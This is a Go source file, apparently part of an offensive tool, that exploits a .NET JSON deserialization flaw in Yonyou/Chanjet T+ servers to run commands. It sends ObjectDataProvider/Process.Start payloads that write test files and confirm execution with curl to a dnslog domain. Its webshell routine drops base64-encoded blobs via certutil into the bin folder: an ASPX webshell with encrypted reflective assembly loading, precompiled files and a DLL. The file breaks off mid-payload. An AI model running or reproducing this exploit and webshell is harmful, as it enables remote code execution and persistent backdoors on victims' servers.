package tools

import (
	"bufio"
	"bytes"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"
)

func UrlHandler(target string) string {
	if !strings.HasPrefix(target, "http") {
		target = "http://" + target
	}
	targetURL, err := url.Parse(target)
	if err != nil {
		fmt.Println("解析URL失败:", err)
		return target
	}
	targetURL.Path = ""
	target = targetURL.String()
	if strings.HasSuffix(target, "/") {
		target = strings.TrimSuffix(target, "/")
	}
	return target
}
func getStatusCode(url string) int {
	resp, err := http.Get(url)
	if err != nil {
		return -1
	}
	defer resp.Body.Close()
	return resp.StatusCode
}

func ReadFile(filePath string) ([]string, error) {

	var lines []string
	file, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines, scanner.Err()
}
func POC(target string) bool {
	vulurl := target + "/tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore"
	Code := getStatusCode(vulurl)
	if Code == 200 {
		req, _ := http.NewRequest("GET", vulurl, nil)
		res, err := http.DefaultClient.Do(req)
		if err != nil {
			fmt.Println("target: %s 访问错误\n", target)
		}
		defer res.Body.Close()
		body, _ := ioutil.ReadAll(res.Body)
		if strings.Contains(string(body), "$T.DTO") {
			domain, cookie := GetDomain()
			Exp(target, domain, cookie)
		}
		return false
	} else {
		return false
	}

}
func POC1(target string, code string) bool {
	vulurl := target + "/tplus/" + code + ".txt"
	Code := getStatusCode(vulurl)
	if Code == 200 {
		req, _ := http.NewRequest("GET", vulurl, nil)
		res, err := http.DefaultClient.Do(req)
		if err != nil {
			fmt.Println("target: %s 访问错误\n", target)
		}
		defer res.Body.Close()
		body, _ := ioutil.ReadAll(res.Body)
		if strings.Contains(string(body), "a0954cf045be9645") {
			fmt.Println("[+]存在漏洞,文件写入成功。")
		}
		return false
	} else {
		fmt.Println("[-]文件写入未成功。")
		return false
	}

}
func FileExp(target string) {
	code := strconv.Itoa(int(time.Now().Unix()))
	poc := "echo a0954cf045be9645 >" + code + ".txt"
	poc1 := "del " + code + ".txt"
	vulurl := target + "/tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore"
	data := fmt.Sprintf(`{
		"storeID": {
			"__type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
			"MethodName": "Start",
			"ObjectInstance": {
				"__type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
				"StartInfo": {
					"__type": "System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
					"FileName": "cmd",
					"Arguments": "/c  ` + poc + `"
				}
			}
		}
	}`)
	req, _ := http.NewRequest("POST", vulurl, bytes.NewBuffer([]byte(data)))
	req.Header.Set("User-Agent", "Mozilla/5.0 (WindOW5 NT 10,0; Win64; x64; rv:71.0) Gecko/28100101 Firefox/71.0")
	req.Header.Set("Content-type", "application/x-www-form-urlencoded")
	Client := http.Client{}
	Client.Do(req)
	POC1(target, code)
	data1 := fmt.Sprintf(`{
		"storeID": {
			"__type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
			"MethodName": "Start",
			"ObjectInstance": {
				"__type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
				"StartInfo": {
					"__type": "System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
					"FileName": "cmd",
					"Arguments": "/c  ` + poc1 + `"
				}
			}
		}
	}`)
	req1, _ := http.NewRequest("POST", vulurl, bytes.NewBuffer([]byte(data1)))
	req.Header.Set("User-Agent", "Mozilla/5.0 (WindOW5 NT 10,0; Win64; x64; rv:71.0) Gecko/28100101 Firefox/71.0")
	req.Header.Set("Content-type", "application/x-www-form-urlencoded")
	Client1 := http.Client{}
	Client1.Do(req1)
}
func Exp(target string, domain string, cookie string) {
	code := time.Now().Unix()
	poc := fmt.Sprintf("%d.%s", code, domain)
	vulurl := target + "/tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore"
	data := fmt.Sprintf(`{
		"storeID": {
			"__type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
			"MethodName": "Start",
			"ObjectInstance": {
				"__type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
				"StartInfo": {
					"__type": "System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
					"FileName": "cmd",
					"Arguments": "/c curl ` + poc + `"
				}
			}
		}
	}`)
	req, _ := http.NewRequest("POST", vulurl, bytes.NewBuffer([]byte(data)))
	req.Header.Set("User-Agent", "Mozilla/5.0 (WindOW5 NT 10,0; Win64; x64; rv:71.0) Gecko/28100101 Firefox/71.0")
	req.Header.Set("Content-type", "application/x-www-form-urlencoded")
	Client := http.Client{}
	resp, _ := Client.Do(req)
	body, _ := ioutil.ReadAll(resp.Body)
	res := strings.Replace(string(body), "执行错误", "", -1)
	res = strings.TrimSpace(res)
	if strings.Contains(res, "actorId") && strings.Contains(res, "archivesId") {
		time.Sleep(10 * time.Second)
		rs := GetRecords(cookie)
		if rs.IsEmpty() {
			fmt.Println("[-]target: " + target + " dnslog未成功\n")
		} else {
			fmt.Println("[+]target: " + target + " dnslog成功\n")
		}

	} else {
		fmt.Println("[-]poc执行未成功")
	}
}
func ExpWebshell(target string) {
	vulurl := target + "/tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore"
	poc := "echo PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiU+PCV0cnkgeyBzdHJpbmcga2V5ID0gIjNjNmUwYjhhOWMxNTIyNGEiOyBzdHJpbmcgcGFzcyA9ICJwYXNzIjsgc3RyaW5nIG1kNSA9IFN5c3RlbS5CaXRDb252ZXJ0ZXIuVG9TdHJpbmcobmV3IFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuTUQ1Q3J5cHRvU2VydmljZVByb3ZpZGVyKCkuQ29tcHV0ZUhhc2goU3lzdGVtLlRleHQuRW5jb2RpbmcuRGVmYXVsdC5HZXRCeXRlcyhwYXNzICsga2V5KSkpLlJlcGxhY2UoIi0iLCAiIik7IGJ5dGVbXSBkYXRhID0gU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhDb250ZXh0LlJlcXVlc3RbcGFzc10pOyBkYXRhID0gbmV3IFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUmlqbmRhZWxNYW5hZ2VkKCkuQ3JlYXRlRGVjcnlwdG9yKFN5c3RlbS5UZXh0LkVuY29kaW5nLkRlZmF1bHQuR2V0Qnl0ZXMoa2V5KSwgU3lzdGVtLlRleHQuRW5jb2RpbmcuRGVmYXVsdC5HZXRCeXRlcyhrZXkpKS5UcmFuc2Zvcm1GaW5hbEJsb2NrKGRhdGEsIDAsIGRhdGEuTGVuZ3RoKTsgaWYgKENvbnRleHQuU2Vzc2lvblsicGF5bG9hZCJdID09IG51bGwpIHsgQ29udGV4dC5TZXNzaW9uWyJwYXlsb2FkIl0gPSAoU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHkpdHlwZW9mKFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5KS5HZXRNZXRob2QoIkxvYWQiLCBuZXcgU3lzdGVtLlR5cGVbXSB7IHR5cGVvZihieXRlW10pIH0pLkludm9rZShudWxsLCBuZXcgb2JqZWN0W10geyBkYXRhIH0pOyA7IH0gZWxzZSB7IFN5c3RlbS5JTy5NZW1vcnlTdHJlYW0gb3V0U3RyZWFtID0gbmV3IFN5c3RlbS5JTy5NZW1vcnlTdHJlYW0oKTsgb2JqZWN0IG8gPSAoKFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5KUNvbnRleHQuU2Vzc2lvblsicGF5bG9hZCJdKS5DcmVhdGVJbnN0YW5jZSgiTFkiKTsgby5FcXVhbHMoQ29udGV4dCk7IG8uRXF1YWxzKG91dFN0cmVhbSk7IG8uRXF1YWxzKGRhdGEpOyBvLlRvU3RyaW5nKCk7IGJ5dGVbXSByID0gb3V0U3RyZWFtLlRvQXJyYXkoKTsgQ29udGV4dC5SZXNwb25zZS5Xcml0ZShtZDUuU3Vic3RyaW5nKDAsIDE2KSk7IENvbnRleHQuUmVzcG9uc2UuV3JpdGUoU3lzdGVtLkNvbnZlcnQuVG9CYXNlNjRTdHJpbmcobmV3IFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUmlqbmRhZWxNYW5hZ2VkKCkuQ3JlYXRlRW5jcnlwdG9yKFN5c3RlbS5UZXh0LkVuY29kaW5nLkRlZmF1bHQuR2V0Qnl0ZXMoa2V5KSwgU3lzdGVtLlRleHQuRW5jb2RpbmcuRGVmYXVsdC5HZXRCeXRlcyhrZXkpKS5UcmFuc2Zvcm1GaW5hbEJsb2NrKHIsIDAsIHIuTGVuZ3RoKSkpOyBDb250ZXh0LlJlc3BvbnNlLldyaXRlKG1kNS5TdWJzdHJpbmcoMTYpKTsgfSB9IGNhdGNoIChTeXN0ZW0uRXhjZXB0aW9uKSB7IH0KJT4= > bin//53439404fae74175.txt && certutil -decode bin//53439404fae74175.txt  bin//53439404fae74175.aspx && del  bin\\53439404fae74175.txt"
	poc1 := "echo 77u/PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4KPHByZXNlcnZlIHJlc3VsdFR5cGU9IjMiIHZpcnR1YWxQYXRoPSIvNTM0Mzk0MDRmYWU3NDE3NS5hc3B4IiBoYXNoPSI4OGVlYzdiMWEiIGZpbGVoYXNoPSJmZmZmZGU0ZTQzODU0NTNlIiBmbGFncz0iMTEwMDAwIiBhc3NlbWJseT0iQXBwX1dlYl81MzQzOTQwNGZhZTc0MTc1LmFzcHguY2RjYWI3ZDIiIHR5cGU9IkFTUC5fNTM0Mzk0MDRmYWU3NDE3NV9hc3B4Ij4KICAgIDxmaWxlZGVwcz4KICAgICAgICA8ZmlsZWRlcCBuYW1lPSIvNTM0Mzk0MDRmYWU3NDE3NS5hc3B4IiAvPgogICAgPC9maWxlZGVwcz4KPC9wcmVzZXJ2ZT4= > bin//53439404fae74175.aspx.cdcab7d2.compiled.txt && certutil -decode bin//53439404fae74175.aspx.cdcab7d2.compiled.txt  bin//53439404fae74175.aspx.cdcab7d2.compiled && del  bin\\53439404fae74175.aspx.cdcab7d2.compiled.txt"
	poc2 := "echo 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cmxpYgBTeXN0ZW0AT2JqZWN0AF9faW5pdGlhbGl6ZWQAX19maWxlRGVwZW5kZW5jaWVzAC5jdG9yAFN5c3RlbS5XZWIuUHJvZmlsZQBEZWZhdWx0UHJvZmlsZQBnZXRfUHJvZmlsZQBnZXRfU3VwcG9ydEF1dG9FdmVudHMASHR0cEFwcGxpY2F0aW9uAGdldF9BcHBsaWNhdGlvbkluc3RhbmNlAF9fQnVpbGRDb250cm9sVHJlZQBIdG1sVGV4dFdyaXRlcgBDb250cm9sAF9fUmVuZGVyX19jb250cm9sMQBGcmFtZXdvcmtJbml0aWFsaXplAEdldFR5cGVIYXNoQ29kZQBIdHRwQ29udGV4dABQcm9jZXNzUmVxdWVzdABQcm9maWxlAFN1cHBvcnRBdXRvRXZlbnRzAEFwcGxpY2F0aW9uSW5zdGFuY2UAQ3JlYXRlX0FTUF9fNTM0Mzk0MDRmYWU3NDE3NV9hc3B4AF9fY3RybABfX3cAcGFyYW1ldGVyQ29udGFpbmVyAGNvbnRleHQAU3lzdGVtLkNvZGVEb20uQ29tcGlsZXIAR2VuZXJhdGVkQ29kZUF0dHJpYnV0ZQBTeXN0ZW0uU2VjdXJpdHkAU2VjdXJpdHlSdWxlc0F0dHJpYnV0ZQBTZWN1cml0eVJ1bGVTZXQAU3lzdGVtLlJ1bnRpbWUuVmVyc2lvbmluZwBUYXJnZXRGcmFtZXdvcmtBdHRyaWJ1dGUAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAEFwcF9XZWJfNTM0Mzk0MDRmYWU3NDE3NS5hc3B4LmNkY2FiN2QyAFN5c3RlbS5EaWFnbm9zdGljcwBEZWJ1Z2dlck5vblVzZXJDb2RlQXR0cmlidXRlAFRlbXBsYXRlQ29udHJvbABzZXRfQXBwUmVsYXRpdmVWaXJ0dWFsUGF0aABTdHJpbmcAR2V0V3JhcHBlZEZpbGVEZXBlbmRlbmNpZXMAZ2V0X0NvbnRleHQAUHJvZmlsZUJhc2UASW5pdGlhbGl6ZUN1bHR1cmUAUmVuZGVyTWV0aG9kAFNldFJlbmRlck1ldGhvZERlbGVnYXRlAFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkATUQ1Q3J5cHRvU2VydmljZVByb3ZpZGVyAFN5c3RlbS5UZXh0AEVuY29kaW5nAGdldF9EZWZhdWx0AENvbmNhdABHZXRCeXRlcwBIYXNoQWxnb3JpdGhtAENvbXB1dGVIYXNoAEJpdENvbnZlcnRlcgBUb1N0cmluZwBSZXBsYWNlAE > bin//App_Web_53439404fae74175.aspx.cdcab7d2.dll.txt"
	poc3 := "echo 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 >> bin//App_Web_53439404fae74175.aspx.cdcab7d2.dll.txt && certutil -decode bin//App_Web_53439404fae74175.aspx.cdcab7d2.dll.txt  bin//App_Web_53439404fae74175.aspx.cdcab7d2.dll && del  bin\\App_Web_53439404fae74175.aspx.cdcab7d2.dll.txt"
	data := fmt.Sprintf(`{
		"storeID": {
			"__type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
			"MethodName": "Start",
			"ObjectInstance": {
				"__type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
				"StartInfo": {
					"__type": "System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
					"FileName": "cmd",
					"Arguments": "/c  ` + poc + `"
				}
			}
		}
	}`)
	data1 := fmt.Sprintf(`{
		"storeID": {
			"__type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
			"MethodName": "Start",
			"ObjectInstance": {
				"__type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
				"StartInfo": {
					"__type": "System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
					"FileName": "cmd",
					"Arguments": "/c  ` + poc1 + `"
				}
			}
		}
	}`)
	data2 := fmt.Sprintf(`{
		"storeID": {
			"__type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
			"MethodName": "Start",
